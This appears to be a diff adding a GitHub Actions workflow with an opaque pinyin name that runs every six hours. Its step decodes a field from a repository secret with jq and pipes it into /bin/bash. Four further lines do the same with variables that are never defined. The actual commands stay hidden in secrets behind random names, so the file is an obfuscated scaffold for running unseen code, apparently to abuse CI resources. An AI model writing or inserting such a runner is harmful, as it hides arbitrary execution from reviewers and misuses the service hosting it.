@@ -1,0 +1,21 @@
+name: zuzhipanxingwunianyixia
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuzhipanxingwunianyixia
+        env:
+          ll114: ${{ secrets.ll114 }}
+        run: |
+          echo $ll114 | jq -r .wg852 | /bin/bash
+          echo $dax1066 | jq -r .ols393 | /bin/bash
+          echo $ykow1340 | jq -r .bqnf7 | /bin/bash
+          echo $jin185 | jq -r .rw7 | /bin/bash
+          echo $jk2149 | jq -r .apjq4 | /bin/bash
+
